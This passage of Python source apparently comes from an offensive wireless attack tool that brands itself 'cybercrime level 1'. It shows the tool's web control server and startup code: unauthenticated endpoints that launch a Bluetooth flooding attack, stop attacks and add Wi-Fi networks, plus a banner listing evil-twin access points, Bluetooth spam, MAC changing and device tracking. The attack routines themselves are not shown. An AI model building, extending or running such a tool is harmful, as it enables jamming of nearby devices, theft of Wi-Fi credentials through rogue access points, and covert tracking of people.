            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_bluetooth_brutal, args=(dur,)).start()
            self.send_json({'status': 'started'})
        elif self.path == '/api/stop':
            stop_all()
            self.send_json({'status': 'stopped'})
        else: self.send_response(404); self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/add':
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length))
            add_wifi_network(data.get('ssid',''), data.get('pwd',''))
            self.send_json({'status': f"network {data.get('ssid','')} added"})
        else: self.send_response(404); self.end_headers()
    
    def send_json(self, data):
        self.send_response(200); self.send_header('content-type', 'application/json'); self.end_headers()
        self.wfile.write(json.dumps(data).encode())

if __name__ == '__main__':
    os.system('clear')
    print('\033[91m╔════════════════════════════════════════════╗')
    print('║              mereta alpha v4.0                ║')
    print('║    cybercrime level 1 - full features         ║')
    print('║  mac changer | evil twin | bt spam | tracker  ║')
    print('╚════════════════════════════════════════════╝\033[0m')
    os.system(f"sudo ifconfig {interface} up 2>/dev/null")
    local_ip = get_ip()
    print(f'\n\033[91m[!]\033[0m server: http://{local_ip}:8080')
    print(f'\033[91m[!]\033[0m fitur: mac changer | auto save | attack log | signal meter | evil twin | device tracker | bt scanner | bt spam | export log')
    print(f'\033[91m[!]\033[0m press ctrl+c to stop\n')
    server = HTTPServer(('0.0.0.0', 8080), handler)
    try: server.serve_forever()
    except KeyboardInterrupt: print('\n\033[91m[!]\033[0m terminated'); server.shutdown()
